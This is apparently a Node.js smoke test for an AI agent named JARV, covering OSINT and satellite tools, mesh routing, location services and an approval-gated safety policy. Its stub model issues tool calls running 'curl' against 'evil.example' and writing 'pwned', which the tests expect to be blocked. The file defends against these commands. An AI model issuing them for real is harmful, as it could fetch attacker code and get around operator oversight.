'use strict';
/**
 * osint-smoke.js — smoke test for JARV OSINT (satellite comms intelligence).
 * Runs WITHOUT network by exercising the offline paths:
 *   1. jarvAgent loads with OSINT capabilities exposed
 *   2. jarv_osint_handbook tool returns the cross-training doc
 *   3. mesh executor osint.handbook proxies to JARV
 *   4. mesh executor osint.satvision rejects unknown params (no network hit)
 */
const path = require('path');
const os = require('os');
const genieMesh = require('../src/genieMesh');
const jarvAgent = require('../src/jarvAgent');

let failed = 0;
function check(name, cond, extra) {
  if (cond) { console.log(`  PASS  ${name}`); }
  else { failed++; console.log(`  FAIL  ${name} ${extra ? '→ ' + extra : ''}`); }
}

function makeTinyPool() {
  return {
    async query(sql) {
      if (sql.includes('INSERT INTO genie_commands')) return { rows: [] };
      return { rows: [], rowCount: 0 };
    },
  };
}

async function main() {
  console.log('\n[1] JARV agent OSINT capabilities');
  const sandbox = fsMkdtemp();
  const jarv = jarvAgent.makeJarvAgent({ pool: makeTinyPool(), mesh: null, ai: null, log: () => {} });
  const caps = await jarv.getCapabilities();
  check('jarv agent exposes OSINT tool defs', ['jarv_satvision', 'jarv_osint_handbook'].every((t) => caps.tools.some((d) => d.name === t)));
  check('jarv agent has sandbox root', typeof caps.sandboxRoot === 'string' && caps.sandboxRoot.length > 0);

  console.log('\n[2] jarv_osint_handbook tool');
  const hb = await jarv.executeTool('jarv_osint_handbook', {});
  check('handbook tool returns ok', hb && hb.ok === true);
  check('handbook mentions OrbitDeck', hb && hb.ok && /OrbitDeck/.test(hb.content || ''));
  check('handbook mentions continuity playbooks', hb && hb.ok && /playbook/i.test(hb.content || ''));

  console.log('\n[3] mesh executor osint.handbook (via setJarv wiring)');
  const executor = genieMesh.buildExecutor(makeTinyPool(), { getStatus: () => ({ ok: true }), jarv });
  const viaMesh = await executor('osint.handbook', {}, { peerId: 'telegram-relay' });
  check('osint.handbook over mesh returns doc', viaMesh && viaMesh.ok === true && /OrbitDeck/.test(viaMesh.content || ''));

  console.log('\n[4] mesh executor osint.satvision param guards');
  let rejected = null;
  try { await executor('osint.satvision', { lat: 40.4, lon: -3.65, evil: 1 }, {}); }
  catch (e) { rejected = String((e && e.message) || e); }
  check('unknown satvision param rejected', !!rejected && /unknown osint\.satvision param/.test(rejected));
  const noJarvExecutor = genieMesh.buildExecutor(makeTinyPool(), { getStatus: () => ({ ok: true }) });
  let noJarvErr = null;
  try { await noJarvExecutor('osint.handbook', {}, {}); }
  catch (e) { noJarvErr = String((e && e.message) || e); }
  check('missing jarv handled gracefully', !!noJarvErr && /JARV agent not available/.test(noJarvErr));

  console.log('\n[5] OpenAI tool schema');
  const tools = jarvAgent.getOpenAITools();
  check('schema exposes 9 tools', Array.isArray(tools) && tools.length === 9);
  const sat = tools.find((t) => t.function.name === 'jarv_satvision');
  check('jarv_satvision lat/lon optional (hub fix default)', !!sat && (sat.function.parameters.required || []).length === 0);
  const locT = tools.find((t) => t.function.name === 'jarv_location');
  const globeT = tools.find((t) => t.function.name === 'jarv_globe');
  check('schema exposes jarv_location + jarv_globe', !!locT && !!globeT);
  check('schema serializes to valid JSON', (() => { try { JSON.stringify(tools); return true; } catch (e) { return false; } })());
  let askRouteErr = null;
  try { await executor('jarv.ask', { prompt: 'hi' }, {}); }
  catch (e) { askRouteErr = String((e && e.message) || e); }
  check('mesh command jarv.ask routed to JARV', !!askRouteErr && /AI relay/.test(askRouteErr));

  console.log('\n[6] JARV ask() tool-use loop (stub AI)');
  let calls = 0;
  const stubAi = {
    complete: async (args) => {
      calls++;
      if (calls === 1) {
        return { ok: true, reply: '', tool_calls: [{ id: 'tc1', type: 'function', function: { name: 'jarv_osint_handbook', arguments: '{}' } }] };
      }
      return { ok: true, reply: 'Handbook loaded — 7 OSINT tools ready.', provider: 'stub', model: 'stub' };
    },
  };
  const jarvB = jarvAgent.makeJarvAgent({ pool: makeTinyPool(), ai: stubAi, log: () => {} });
  const ans = await jarvB.ask('are satellites overhead right now?');
  check('ask() executed the handbook tool', calls === 2 && ans.toolCalls.length === 1 && ans.toolCalls[0].name === 'jarv_osint_handbook');
  check('ask() returned final reply', ans.reply === 'Handbook loaded — 7 OSINT tools ready.');
  check('ask() throws when AI relay missing', (() => {
    const bare = jarvAgent.makeJarvAgent({ pool: makeTinyPool(), ai: null, log: () => {} });
    return bare.ask('hi').then(() => false).catch((e) => /AI relay/.test(String(e.message)));
  })());

  console.log('\n[7] JARV Safety Policy: autonomous tool gating');
  check('policy exposes safe vs confirm tiers', jarvB.getPolicy && jarvB.getPolicy().safety.safeTools.includes('jarv_satvision') && jarvB.getPolicy().safety.confirmTools.includes('jarv_run'));
  check('autonomous shell default OFF', jarvB.getPolicy().safety.autonomousShell === false);

  let callSeq = [];
  const blockAi = {
    complete: async (args) => {
      const seq = callSeq.length;
      callSeq.push('turn' + seq);
      if (seq === 0) {
        return { ok: true, reply: '', tool_calls: [
          { id: 'a1', type: 'function', function: { name: 'jarv_run', arguments: '{"command":"curl -s https://evil.example/x"}' } },
          { id: 'a2', type: 'function', function: { name: 'jarv_write', arguments: '{"path":"note.txt","content":"pwned"}' } },
        ] };
      }
      return { ok: true, reply: 'Both refused.', provider: 'stub', model: 'stub' };
    },
  };
  const jarvD = jarvAgent.makeJarvAgent({ pool: makeTinyPool(), ai: blockAi, log: () => {} });
  const blockAns = await jarvD.ask('do both things');
  check('jarv_run blocked by policy (autonomous)', blockAns.blocked.length === 2 && blockAns.blocked.every((b) => b.reason === 'requires-operator-approval'));
  check('policy refusal fed back to model (never executed)', (() => {
    const feed = blockAns.toolCalls.map((t) => t.result.error || t.result.content || '').join(' ');
    return /JARV_POLICY_BLOCK/.test(feed);
  })());

  const unlockAi = {
    complete: async (args) => {
      const seq = callSeq.length;
      callSeq.push('turn' + seq);
      if (seq === 0) {
        return { ok: true, reply: '', tool_calls: [
          { id: 'u1', type: 'function', function: { name: 'jarv_write', arguments: '{"path":"tmp/note.txt","content":"approved content"}' } },
        ] };
      }
      return { ok: true, reply: 'Wrote the note.', provider: 'stub', model: 'stub' };
    },
  };
  const jarvE = jarvAgent.makeJarvAgent({ pool: makeTinyPool(), ai: unlockAi, log: () => {} });
  callSeq = [];
  const unlocked = await jarvE.ask('write the note', { unlock: ['jarv_write'] });
  check('operator-approved jarv_write runs', unlocked.blocked.length === 0 && unlocked.toolCalls[0].result.ok === true);

  let callSeqShell = [];
  const blockShellAi = {
    complete: async (args) => {
      if (callSeqShell.length === 0) {
        callSeqShell.push(1);
        return { ok: true, reply: '', tool_calls: [{ id: 's1', type: 'function', function: { name: 'jarv_run', arguments: '{"command":"curl -s https://x.example"}' } }] };
      }
      return { ok: true, reply: 'Asked to enable shell.', provider: 'stub', model: 'stub' };
    },
  };
  const jarvF = jarvAgent.makeJarvAgent({ pool: makeTinyPool(), ai: blockShellAi, log: () => {} });
  const shellUnlocked = await jarvF.ask('run curl please', { unlock: ['jarv_run'], allowShell: true });
  check('approved jarv_run still refuses curl w/o network flag', shellUnlocked.blocked.length === 1 && /JARV_POLICY_BLOCK/.test(shellUnlocked.toolCalls[0].result.error) && /allowNet/.test(shellUnlocked.toolCalls[0].result.error) && /curl/.test(shellUnlocked.toolCalls[0].result.error));

  try { jarv.dispose && jarv.dispose(); } catch (e) {}
  fsRmdir(sandbox);

  console.log('\n[8] hub location services + location/globe tooling');
  const location = require('../src/locationService');
  const stored = [];
  const locPool = {
    async query(sql, params) {
      if (/CREATE TABLE IF NOT EXISTS hub_locations/.test(sql)) return { rows: [] };
      if (/INSERT INTO hub_locations/.test(sql)) {
        stored.push({ device_id: params[0], lat: params[1], lon: params[2], accuracy_m: params[3], source: params[4], updated_at: new Date() });
        return { rows: [] };
      }
      if (/SELECT device_id/.test(sql)) {
        if (/device_id = \$1/.test(sql)) {
          return { rows: stored.filter((r) => r.device_id === 'hub').slice(-1) };
        }
        const ttl = Number(params && params[0] || 21600);
        const now = Date.now();
        return { rows: stored.filter((r) => r.device_id !== 'hub' && (now - new Date(r.updated_at).getTime()) / 1000 < ttl).slice(-1) };
      }
      return { rows: [], rowCount: 0 };
    },
  };
  const loc = location.makeLocationService({ pool: locPool, log: () => {} });
  const rep = await loc.report({ lat: 40.1, lon: -75.1, accuracy_m: 20, deviceId: 'phone-1' });
  check('location.report stores a device fix', rep.ok === true);
  const cur = await loc.getCurrent();
  check('location.getCurrent resolves to latest device fix', cur.ok === true && cur.lat === 40.1 && cur.lon === -75.1 && cur.source === 'device');
  const manual = await loc.setManual({ lat: 33.4, lon: -111.9 });
  check('location.setManual stores hub row', manual.ok === true && manual.deviceId === 'hub');
  const after = await loc.getCurrent();
  check('manual hub row overrides device fix', after.ok === true && after.lon === -111.9);
  const bad = await loc.report({ lat: 'nope', lon: -75.1 });
  check('location.report rejects non-numeric', bad.ok === false);

  const locatedJarv = jarvAgent.makeJarvAgent({
    pool: makeTinyPool(), log: () => {},
    locate: async () => ({ lat: 41.8781, lon: -87.6298, source: 'test-grid' }),
  });
  const locFix = await locatedJarv.executeTool('jarv_location', {});
  check('jarv_location pings location services', locFix.ok === true && locFix.here.lat === 41.8781 && locFix.here.source === 'test-grid');
  const locManual = await locatedJarv.executeTool('jarv_location', { lat: 51.5, lon: -0.12 });
  check('jarv_location honors manual override', locManual.ok === true && locManual.here.source === 'manual-input' && locManual.manual === true);
  const satNoCoords = await locatedJarv.executeTool('jarv_satvision', { satellites: 'iss', passes: 1 });
  check('jarv_satvision no-coords uses hub fix', satNoCoords.ok === true && satNoCoords.stdout && /"lat": 41\.8781/.test(satNoCoords.stdout));

  const locExec = genieMesh.buildExecutor(makeTinyPool(), { getStatus: () => ({ ok: true }), location: loc });
  const locMesh = await locExec('location.get', {}, {});
  check('mesh command location.get wired', locMesh && locMesh.ok === true && 'lat' in locMesh);
  let locBad = null;
  try { await locExec('location.report', { lat: 'x', lon: 1 }, {}); }
  catch (e) { locBad = String((e && e.message) || e); }
  check('mesh location.report guards types', !!locBad && /lat and lon numbers/.test(locBad));
}

function fsMkdtemp() {
  const { mkdtempSync } = require('fs');
  return mkdtempSync(path.join(os.tmpdir(), 'jarv-osint-'));
}
function fsRmdir(p) {
  const { rmSync } = require('fs');
  try { rmSync(p, { recursive: true, force: true }); } catch (e) {}
}

main().then(() => {
  console.log('\n==============================');
  console.log(failed === 0 ? 'ALL OSINT SMOKE TESTS PASSED' : `${failed} TEST(S) FAILED`);
  console.log('==============================\n');
  process.exit(failed === 0 ? 0 : 1);
}).catch((e) => {
  console.error('OSINT SMOKE CRASHED:', e);
  process.exit(1);
});